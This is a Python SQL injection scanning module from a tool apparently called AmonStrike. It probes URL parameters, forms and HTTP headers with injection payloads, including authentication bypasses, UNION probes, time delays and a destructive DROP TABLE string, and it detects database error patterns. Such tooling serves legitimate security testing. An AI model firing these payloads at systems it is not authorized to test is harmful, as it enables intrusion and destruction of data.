"""
AmonStrike — SQL Injection Module
Tests GET/POST parameters and headers for SQLi.
"""

import re
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
from .base import BaseModule


class SqliModule(BaseModule):
    NAME        = "sqli"
    DESCRIPTION = "SQL Injection — GET/POST/headers/blind/error-based"

    # Error-based SQLi detection patterns
    ERROR_PATTERNS = [
        # MySQL
        (r"You have an error in your SQL syntax", "MySQL"),
        (r"Warning: mysql_", "MySQL"),
        (r"MySQLSyntaxErrorException", "MySQL"),
        (r"valid MySQL result", "MySQL"),
        (r"check the manual that corresponds to your MySQL", "MySQL"),
        # PostgreSQL
        (r"PostgreSQL.*ERROR", "PostgreSQL"),
        (r"Warning: pg_", "PostgreSQL"),
        (r"valid PostgreSQL result", "PostgreSQL"),
        (r"Npgsql\.", "PostgreSQL"),
        # MSSQL
        (r"Driver.* SQL[\-\_\ ]*Server", "MSSQL"),
        (r"OLE DB.* SQL Server", "MSSQL"),
        (r"SQLServer JDBC Driver", "MSSQL"),
        (r"Microsoft SQL Native Client error", "MSSQL"),
        # Oracle
        (r"ORA-[0-9][0-9][0-9][0-9]", "Oracle"),
        (r"Oracle error", "Oracle"),
        (r"Oracle.*Driver", "Oracle"),
        # SQLite
        (r"SQLite/JDBCDriver", "SQLite"),
        (r"SQLite.Exception", "SQLite"),
        (r"System.Data.SQLite.SQLiteException", "SQLite"),
        # Generic
        (r"Unclosed quotation mark", "Generic SQL"),
        (r"quoted string not properly terminated", "Generic SQL"),
        (r"SQL syntax.*MySQL", "Generic SQL"),
        # SQLite (what testphp actually uses)
        (r"unrecognized token", "SQLite"),
        (r"near.*syntax error", "SQLite"),
        (r"sqlite3.OperationalError", "SQLite"),
        # PHP mysql functions (old style)
        (r"mysql_fetch_array", "MySQL-PHP"),
        (r"mysql_fetch_assoc", "MySQL-PHP"),
        (r"mysql_num_rows", "MySQL-PHP"),
        (r"supplied argument is not a valid MySQL", "MySQL-PHP"),
        (r"Column count doesn", "MySQL"),
        (r"The used SELECT statements have", "MySQL"),
    ]

    # Basic SQLi payloads
    PAYLOADS = [
        "'",
        "''",
        "`",
        "\"",
        "\\",
        "'--",
        "'--+",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR 1=1--",
        "1 OR 1=1",
        "1' OR '1'='1",
        "admin'--",
        "' OR 'x'='x",
        "1; DROP TABLE users--",
        "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL--",
        "1 AND 1=1",
        "1 AND 1=2",
        "' AND '1'='1",
        "' AND '1'='2",
        # Time-based blind
        "'; WAITFOR DELAY '0:0:5'--",
        "1; SELECT SLEEP(5)--",
        "'; SELECT pg_sleep(5)--",
    ]

    # Headers to test
    INJECTABLE_HEADERS = [
        "User-Agent",
        "X-Forwarded-For",
        "Referer",
        "Cookie",
        "X-Real-IP",
    ]

    def run(self):
        self.log("Testing SQL injection vectors...")

        # Get the page and extract forms + parameters
        resp = self.get()
        if not resp:
            return self.result()

        self.baseline_length = len(resp.text)
        self.baseline_content = resp.text

        # Test URL parameters
        self._test_url_params()

        # Test forms
        self._test_forms(resp)

        # Test headers
        self._test_headers()

        # Test extra endpoints from recon (each page's params)
        self._test_extra_endpoints()

        self.log(f"SQLi scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _detect_sqli_error(self, response_text):
        """Check if response contains SQL error patterns."""
        for pattern, db_type in self.ERROR_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return db_type
        return None

    def _test_url_params(self):
        """Test URL query parameters for SQLi.
        Priority: 1) URL params if present, 2) spidered links, 3) common params
        """
        parsed = urlparse(self.url)

        if parsed.query:
            # URL already has params — test those first
            params = parse_qs(parsed.query)
            for param, values in params.items():
                self._test_single_param(param, values[0])
                if self.findings: return
        
        # Spider homepage for links with params — these are the real endpoints
        resp = self.get("")
        if resp:
            import re as _re
            links = _re.findall(r'href=["\'"]([^"\'#]+\?[^"\'#]+)["\'"]', resp.text)
            for link in links[:20]:
                if link.startswith("/"): 
                    link = f"{self.parsed.scheme}://{self.parsed.netloc}{link}"
                p2 = urlparse(link)
                params2 = parse_qs(p2.query)
                for param, values in params2.items():
                    # Temporarily adjust URL for this page
                    saved = self.url
                    self.url = f"{p2.scheme}://{p2.netloc}{p2.path}"
                    self._test_single_param(param, values[0])
                    self.url = saved
                    if self.findings: return
        
        # Fallback: common params on base URL
        if not self.findings:
            for param in ["id", "cat", "artist", "page", "q", "search", "item",
                          "user", "name", "product", "news", "order", "record"]:
                self._test_single_param(param, "1")
                if self.findings: return

    def _test_single_param(self, param, original_value):
        """Test a single parameter with all payloads."""
        for payload in self.PAYLOADS[:10]:  # Limit to first 10 for speed
            test_value = original_value + payload
            resp = self.get(params={param: test_value})
            if not resp:
                continue

            # Error-based detection
            db_type = self._detect_sqli_error(resp.text)
            if db_type:
                self.add_finding(
                    title=f"SQL Injection (Error-Based) — Parameter: {param}",
                    severity="CRITICAL",
                    description=f"SQL injection vulnerability detected in parameter '{param}'. Database error from {db_type} is reflected in the response.",
                    evidence=f"Parameter: {param}\nPayload: {payload}\nDB Error: {db_type}\nResponse snippet: {resp.text[:300]}",
                    remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL queries. Use ORM frameworks.",
                    url=resp.url,
                    cve="CWE-89"
                )
                return  # Found, move on

            # Boolean-based blind detection
            if "AND 1=1" in payload or "AND 1=2" in payload:
                self._check_boolean_blind(param, original_value)
                break

    def _check_boolean_blind(self, param, original_value):
        """Check for boolean-based blind SQLi."""
        true_payload  = original_value + "' AND '1'='1"
        false_payload = original_value + "' AND '1'='2"

        r_true  = self.get(params={param: true_payload})
        r_false = self.get(params={param: false_payload})
        r_orig  = self.get(params={param: original_value})

        if not all([r_true, r_false, r_orig]):
            return

        orig_len  = len(r_orig.text)
        true_len  = len(r_true.text)
        false_len = len(r_false.text)

        # Significant length difference indicates boolean injection
        if abs(true_len - false_len) > 50 and abs(true_len - orig_len) < 50:
            self.add_finding(
                title=f"SQL Injection (Boolean Blind) — Parameter: {param}",
                severity="CRITICAL",
                description=f"Boolean-based blind SQL injection detected in parameter '{param}'. Response length differs significantly between TRUE and FALSE conditions.",
                evidence=f"Parameter: {param}\nOriginal length: {orig_len}\nTRUE condition length: {true_len}\nFALSE condition length: {false_len}\nDifference: {abs(true_len - false_len)} bytes",
                remediation="Use parameterized queries. Implement input validation. Use stored procedures.",
                cve="CWE-89"
            )

    def _test_forms(self, resp):
        """Find and test HTML forms for SQLi."""
        from bs4 import BeautifulSoup
        try:
            soup = BeautifulSoup(resp.text, "html.parser")
            forms = soup.find_all("form")
            self.log(f"Found {len(forms)} form(s)", "i")

            for form in forms:
                action = form.get("action", "")
                method = form.get("method", "get").lower()
                form_url = urljoin(self.url, action) if action else self.url

                inputs = {}
                for inp in form.find_all(["input", "textarea", "select"]):
                    name = inp.get("name", "")
                    itype = inp.get("type", "text").lower()
                    if name and itype not in ["submit", "button", "image", "file"]:
                        inputs[name] = inp.get("value", "test")

                if not inputs:
                    continue

                # Test each input
                for field in inputs:
                    for payload in self.PAYLOADS[:8]:
                        test_data = dict(inputs)
                        test_data[field] = payload

                        if method == "post":
                            r = self.post(form_url.replace(self.url, ""), data=test_data)
                        else:
                            r = self.get(form_url.replace(self.url, ""), params=test_data)

                        if not r:
                            continue

                        db_type = self._detect_sqli_error(r.text)
                        if db_type:
                            self.add_finding(
                                title=f"SQL Injection in Form Field: {field}",
                                severity="CRITICAL",
                                description=f"SQL injection in form field '{field}' (method: {method.upper()}). Database: {db_type}.",
                                evidence=f"Form action: {form_url}\nField: {field}\nPayload: {payload}\nDB: {db_type}",
                                remediation="Use parameterized queries for all database operations.",
                                url=form_url,
                                cve="CWE-89"
                            )
                            break
        except ImportError:
            self.log("BeautifulSoup not available for form parsing", "~")

    def _test_headers(self):
        """Test HTTP headers for SQLi."""
        baseline = self.get()
        if not baseline:
            return

        for header in self.INJECTABLE_HEADERS:
            for payload in self.PAYLOADS[:5]:
                r = self.get(headers={header: payload})
                if not r:
                    continue
                db_type = self._detect_sqli_error(r.text)
                if db_type:
                    self.add_finding(
                        title=f"SQL Injection via HTTP Header: {header}",
                        severity="HIGH",
                        description=f"SQL injection in {header} header. Database: {db_type}.",
                        evidence=f"Header: {header}: {payload}\nDB Error: {db_type}",
                        remediation="Sanitize all input including HTTP headers before using in SQL queries.",
                        cve="CWE-89"
                    )
                    break


    def _test_extra_endpoints(self):
        """Crawl the app and test every discovered URL with params."""
        from urllib.parse import urlparse, parse_qs
        
        # First, spider the base URL for links
        r = self.get("")
        if not r:
            return
        
        import re
        # Find all links with query parameters
        links = re.findall(r'href=["\']((?:/|http)[^\s"\'#]+\?[^\s"\'#]+)["\'"]', r.text)
        links += getattr(self, "extra_endpoints", [])
        
        seen = set()
        for link in links[:30]:
            # Build absolute URL
            if link.startswith("/"):
                link = f"{self.parsed.scheme}://{self.parsed.netloc}{link}"
            
            parsed = urlparse(link)
            params = parse_qs(parsed.query)
            
            # Key = path + sorted param names (dedup same params diff values)
            key = parsed.path + "|" + ",".join(sorted(params.keys()))
            if key in seen:
                continue
            seen.add(key)
            
            # Test each param on this URL
            for param, values in params.items():
                original = values[0]
                # Temporarily set base URL to this path for testing
                old_url = self.url
                self.url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                self._test_single_param(param, original)
                self.url = old_url
                if self.findings:
                    break  # Found one on this page

    def _test_endpoint_url(self, url: str):
        """Test a specific discovered URL for SQLi."""
        import re as _re
        # Find parameters in URL
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for param in params:
            for payload in self.PAYLOADS[:8]:
                test_params = dict(params)
                test_params[param] = [payload]
                from urllib.parse import urlencode
                test_url = url.split("?")[0] + "?" + urlencode({k:v[0] for k,v in test_params.items()})
                try:
                    r = self.session.get(test_url, timeout=self.timeout, verify=False)
                    if r and self._is_sqli(r.text):
                        self.add_finding(
                            title=f"SQL Injection — {param} @ {parsed.path}",
                            severity="CRITICAL",
                            description=f"SQLi confirmed in parameter '{param}' at {url}",
                            evidence=f"URL: {test_url}\nPayload: {payload}\n{self._extract_error(r.text)}",
                            remediation="Use prepared statements.",
                            url=test_url, parameter=param, payload=payload, cve="CWE-89",
                        )
                        return
                except Exception:
                    pass
